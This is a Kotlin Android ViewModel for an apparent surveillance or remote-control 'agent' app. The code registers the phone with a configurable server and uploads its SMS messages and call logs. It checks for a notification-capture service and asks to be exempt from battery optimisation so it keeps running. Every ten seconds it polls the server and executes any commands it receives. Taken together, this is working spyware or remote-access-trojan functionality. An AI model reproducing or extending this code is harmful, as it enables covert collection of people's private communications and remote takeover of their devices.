package zxtni.apixer.into.ui.main

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import zxtni.apixer.into.data.AgentPreferences
import zxtni.apixer.into.data.DeviceDataReader
import zxtni.apixer.into.network.ApiClient
import zxtni.apixer.into.network.DeviceRegisterRequest
import zxtni.apixer.into.network.DeviceSyncRequest
import zxtni.apixer.into.network.ServerConfig
import zxtni.apixer.into.service.AgentBackgroundService
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * UI state for the agent dashboard.
 */
data class AgentUiState(
    val serverUrl: String = ServerConfig.baseUrl,
    val deviceApiKey: String = "",
    val isRegistered: Boolean = false,
    val isSyncing: Boolean = false,
    val isRegistering: Boolean = false,
    val isLiveServiceActive: Boolean = true,
    val isBatteryOptimizationIgnored: Boolean = false,
    val isNotificationListenerEnabled: Boolean = false,
    val lastSyncTime: String = "Never",
    val lastSyncSmsCount: Int = 0,
    val lastSyncCallCount: Int = 0,
    val pendingCommandsCount: Int = 0,
    val statusMessage: String = "Idle",
    val logMessages: List<String> = emptyList(),
    val permissionsGranted: Boolean = false,
)

class MainScreenViewModel : ViewModel() {

    private val _uiState = MutableStateFlow(AgentUiState())
    val uiState: StateFlow<AgentUiState> = _uiState.asStateFlow()

    private val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

    /**
     * Initialize state from stored preferences and start background live sync.
     */
    fun initialize(context: Context) {
        val serverUrl = AgentPreferences.getServerUrl(context)
        ServerConfig.baseUrl = serverUrl

        val apiKey = AgentPreferences.getDeviceApiKey(context)
        val registered = AgentPreferences.isDeviceRegistered(context)

        ServerConfig.deviceApiKey = apiKey

        // Ensure live service is active immediately
        AgentBackgroundService.startService(context)

        _uiState.update {
            it.copy(
                serverUrl = serverUrl,
                deviceApiKey = apiKey,
                isRegistered = registered,
                permissionsGranted = checkPermissions(context),
                isBatteryOptimizationIgnored = checkBatteryOptimizationIgnored(context),
                isNotificationListenerEnabled = checkNotificationListenerEnabled(context),
                isLiveServiceActive = AgentBackgroundService.isRunning,
            )
        }

        addLog("Connected to: $serverUrl")
        if (registered && apiKey.isNotBlank()) {
            addLog("Device registered — API key loaded")
            triggerManualSync(context)
        } else {
            addLog("Device not registered — auto-registering...")
            registerDevice(context)
        }

        // Keep UI updated on background service and commands
        viewModelScope.launch {
            while (true) {
                if (_uiState.value.isRegistered) {
                    pollCommands(context)
                }
                _uiState.update {
                    it.copy(
                        isLiveServiceActive = AgentBackgroundService.isRunning,
                        isBatteryOptimizationIgnored = checkBatteryOptimizationIgnored(context),
                    )
                }
                delay(10000)
            }
        }
    }

    /**
     * Register this device with the server.
     */
    fun registerDevice(context: Context) {
        if (ServerConfig.masterApiKey.isBlank()) {
            addLog("❌ Master API key is missing from ServerConfig")
            return
        }

        viewModelScope.launch {
            _uiState.update { it.copy(isRegistering = true, statusMessage = "Registering...") }

            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID,
            )
            val marketDeviceName = try {
                val sysName = Settings.Global.getString(context.contentResolver, "device_name")
                val btName = Settings.Secure.getString(context.contentResolver, "bluetooth_name")
                if (!sysName.isNullOrBlank()) sysName
                else if (!btName.isNullOrBlank()) btName
                else "${Build.MANUFACTURER} ${Build.MODEL}"
            } catch (_: Exception) {
                "${Build.MANUFACTURER} ${Build.MODEL}"
            }

            val payload = DeviceRegisterRequest(
                device_id = deviceId,
                device_name = marketDeviceName,
                model = marketDeviceName.ifBlank { Build.MODEL },
                manufacturer = Build.MANUFACTURER,
                os_version = Build.VERSION.RELEASE,
            )

            val response = ApiClient.registerDevice(payload, ServerConfig.masterApiKey)

            if (response != null) {
                AgentPreferences.setDeviceApiKey(context, response.api_key)
                AgentPreferences.setDeviceRegistered(context, true)
                ServerConfig.deviceApiKey = response.api_key

                _uiState.update {
                    it.copy(
                        isRegistering = false,
                        isRegistered = true,
                        deviceApiKey = response.api_key,
                        statusMessage = "Registered ✓",
                    )
                }
                addLog("✅ Device registered — ID: $deviceId")
                addLog("API key saved")

                // Immediately start background live service with newly acquired key
                AgentBackgroundService.startService(context)
                triggerManualSync(context)
            } else {
                _uiState.update {
                    it.copy(
                        isRegistering = false,
                        statusMessage = "Registration failed",
                    )
                }
                addLog("❌ Registration failed — check server URL (${ServerConfig.baseUrl}) and connection")
            }
        }
    }

    /**
     * Update the server URL and re-register device with the new backend.
     */
    fun updateServerUrl(context: Context, newUrl: String) {
        val cleanUrl = newUrl.trim().removeSuffix("/")
        if (cleanUrl.isBlank()) return

        AgentPreferences.setServerUrl(context, cleanUrl)
        ServerConfig.baseUrl = cleanUrl
        _uiState.update { it.copy(serverUrl = cleanUrl) }
        addLog("Updated Server URL: $cleanUrl")

        reRegisterDevice(context)
    }

    /**
     * Clear existing registration and register again.
     */
    fun reRegisterDevice(context: Context) {
        AgentPreferences.resetRegistration(context)
        ServerConfig.deviceApiKey = ""
        _uiState.update {
            it.copy(
                isRegistered = false,
                deviceApiKey = "",
                statusMessage = "Re-registering..."
            )
        }
        addLog("Re-registering with ${ServerConfig.baseUrl}...")
        registerDevice(context)
    }

    /**
     * Manually trigger a sync cycle.
     */
    fun triggerManualSync(context: Context) {
        if (_uiState.value.deviceApiKey.isBlank()) {
            addLog("❌ No API key — register the device first")
            return
        }

        viewModelScope.launch {
            _uiState.update { it.copy(isSyncing = true, statusMessage = "Syncing...") }
            addLog("Starting manual sync...")

            ServerConfig.deviceApiKey = _uiState.value.deviceApiKey

            // Read device data
            val lastSmsSyncTs = AgentPreferences.getLastSmsSyncTimestamp(context)
            val lastCallSyncTs = AgentPreferences.getLastCallSyncTimestamp(context)

            val smsMessages = DeviceDataReader.readSmsLogs(context, lastSmsSyncTs)
            val callLogs = DeviceDataReader.readCallLogs(context, lastCallSyncTs)

            addLog("Read ${smsMessages.size} SMS, ${callLogs.size} calls")

            if (smsMessages.isEmpty() && callLogs.isEmpty()) {
                _uiState.update {
                    it.copy(isSyncing = false, statusMessage = "No new data")
                }
                addLog("No new data to sync")
                return@launch
            }

            // Upload
            val payload = DeviceSyncRequest(
                sms_messages = smsMessages.ifEmpty { null },
                call_logs = callLogs.ifEmpty { null },
            )
            val response = ApiClient.syncData(payload)

            if (response != null) {
                val now = System.currentTimeMillis()
                AgentPreferences.setLastSmsSyncTimestamp(context, now)
                AgentPreferences.setLastCallSyncTimestamp(context, now)

                _uiState.update {
                    it.copy(
                        isSyncing = false,
                        lastSyncTime = dateFormat.format(Date()),
                        lastSyncSmsCount = response.sms_ingested,
                        lastSyncCallCount = response.calls_ingested,
                        pendingCommandsCount = response.pending_commands,
                        statusMessage = "Sync complete ✓",
                    )
                }
                addLog("✅ Synced — SMS: ${response.sms_ingested}, Calls: ${response.calls_ingested}")
                if (response.pending_commands > 0) {
                    addLog("📬 ${response.pending_commands} pending command(s)")
                }
            } else {
                _uiState.update {
                    it.copy(isSyncing = false, statusMessage = "Sync failed")
                }
                addLog("❌ Sync failed — check server connection")
            }
        }
    }

    /**
     * Poll and execute pending commands.
     */
    fun pollCommands(context: Context) {
        if (_uiState.value.deviceApiKey.isBlank()) {
            return
        }

        viewModelScope.launch {
            ServerConfig.deviceApiKey = _uiState.value.deviceApiKey

            try {
                val commands = ApiClient.fetchPendingCommands()
                
                if (commands.isNotEmpty()) {
                    addLog("Received ${commands.size} command(s)")
                    for (cmd in commands) {
                        addLog("Executing: ${cmd.command_type} (${cmd.command_id.take(8)}...)")
                        zxtni.apixer.into.command.CommandExecutor.execute(context, cmd)
                        addLog("✅ Command ${cmd.command_type} processed")
                    }
                    _uiState.update { it.copy(pendingCommandsCount = 0) }
                }
            } catch (e: Exception) {
                // Ignore silent background network errors
            }
        }
    }

    fun requestDisableBatteryOptimization(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(context.packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:${context.packageName}")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.e("MainScreenVM", "Could not launch battery optimization intent", e)
                }
            }
        }
    }

    fun onPermissionsResult(context: Context) {
        _uiState.update {
            it.copy(
                permissionsGranted = checkPermissions(context),
                isBatteryOptimizationIgnored = checkBatteryOptimizationIgnored(context),
                isNotificationListenerEnabled = checkNotificationListenerEnabled(context),
            )
        }
        // Start foreground service once permissions are granted
        AgentBackgroundService.startService(context)
    }

    fun openNotificationListenerSettings(context: Context) {
        try {
            val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS).apply {
                    putExtra(
                        Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
                        android.content.ComponentName(context, zxtni.apixer.into.service.NotificationCaptureService::class.java).flattenToString()
                    )
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            } else {
                Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            try {
                context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
            } catch (ex: Exception) {
                Log.e("MainScreenVM", "Could not open notification listener settings", ex)
            }
        }
    }

    fun checkNotificationListenerEnabled(context: Context): Boolean {
        return try {
            val enabledListeners = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            val myComponent = android.content.ComponentName(
                context,
                zxtni.apixer.into.service.NotificationCaptureService::class.java
            ).flattenToString()
            enabledListeners.contains(myComponent) || enabledListeners.contains(context.packageName)
        } catch (e: Exception) {
            false
        }
    }
    private fun checkBatteryOptimizationIgnored(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: true
        } else {
            true
        }
    }

    private fun checkPermissions(context: Context): Boolean {
        val required = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            required.add(Manifest.permission.POST_NOTIFICATIONS)
            required.add(Manifest.permission.READ_MEDIA_IMAGES)
            required.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            required.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return required.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun addLog(message: String) {
        val timestamped = "[${dateFormat.format(Date())}] $message"
        _uiState.update {
            it.copy(logMessages = (listOf(timestamped) + it.logMessages).take(50))
        }
    }
}

